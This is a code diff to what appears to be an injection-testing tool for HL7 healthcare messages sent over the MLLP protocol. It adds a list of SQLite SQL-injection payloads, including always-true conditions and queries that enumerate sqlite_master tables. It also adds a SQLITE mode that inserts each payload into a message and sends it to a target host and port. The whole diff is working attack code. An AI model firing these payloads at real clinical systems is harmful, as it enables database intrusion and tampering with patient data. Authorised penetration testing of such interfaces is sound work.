@@ -81,6 +81,20 @@ def mysqlDetect():
     "fake@ema'or'il.nl'='il.nl"]
     return payload
 
+def sqliteDetect():
+    payload = ["1'1",
+    "1 and 1=1",
+    "1' and 1=(select count(*) from tablenames); --",
+    "1 or 1=1",
+    "1' or '1'='1",
+    "1or1=1",
+    "1'or'1'='1",
+    "fake@ema'or'il.nl'='il.nl",
+    "SELECT name FROM sqlite_master WHERE type='table';",
+    "SELECT sqlite_version();",
+    "SELECT * FROM sqlite_master;"]
+    return payload
+
 #send message to host and port, check if response is "AA" which means message acceptedd
 def mllpSender(host, port, message):
     try:
@@ -141,6 +155,13 @@ def injection(host, port, file, mode, inject, payload):
         sys.exit()
     elif mode == "MYSQL":
         payload = mysqlDetect()
+        for i, val in enumerate(payload):
+            modifiedMessage = messageBuilder(message, val, inject)
+            mllpSender(host, port, modifiedMessage)
+        print("[+] %s messages sent." %len(payload))
+        sys.exit()
+    elif mode == "SQLITE":
+        payload = sqliteDetect()
         for i, val in enumerate(payload):
             modifiedMessage = messageBuilder(message, val, inject)
             mllpSender(host, port, modifiedMessage)
